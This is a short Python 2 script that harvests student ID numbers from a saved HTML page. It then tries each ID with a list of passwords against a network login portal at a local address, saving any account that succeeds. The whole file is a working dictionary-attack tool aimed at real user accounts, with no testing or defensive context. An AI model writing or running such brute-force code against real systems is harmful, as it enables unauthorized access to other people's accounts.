#!/usr/bin/env python
#coding=utf-8

import urllib
import urllib2
import cookielib
import re

hostaddr = 'http://192.168.9.6'

#cookie 
#cj = cookielib.LWPCookieJar()
#cookie_support = urllib2.HTTPCookieProcessor(cj)
#httpHandler = urllib2.HTTPHandler(debuglevel=1)
#opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
#urllib2.install_opener(opener)

header = {'User-Agent': 'IE10'}


def login(username, password):
    postData = {'DDDDD': username,
                'upass': password.split()[1],
                'R1': 0,
                'R2': 1,
                }
    postData = urllib.urlencode(postData)
    request = urllib2.Request(hostaddr, postData, header)
    try:
        response = urllib2.urlopen(request, timeout=5)
        ans = response.read()
        t = re.compile(r"(msga='error1';)")
        d = t.findall(ans)
        if len(d):
            f_user.write(username + ' ' + password.split()[0] + '\n')
            global flag 
            flag = 1
    except KeyboardInterrupt:
        raise
    except Exception, e:
        login(username, password)

re_sno = re.compile(r'<td scope="col" align="left" valign="middle" nowrap="">&nbsp;(\d{8,14})</td>')
f_sno = open('xhcx_list.html').read()
sno = re_sno.findall(f_sno)
f_user = open('user.txt', 'a')
for i in sno:
    flag = 0
    print i,
    for j in open('password.txt').readlines():
        login(i, j)
        if flag == 1:
            print 'yes !!!'
            break
    if flag == 0:
        print 'n'
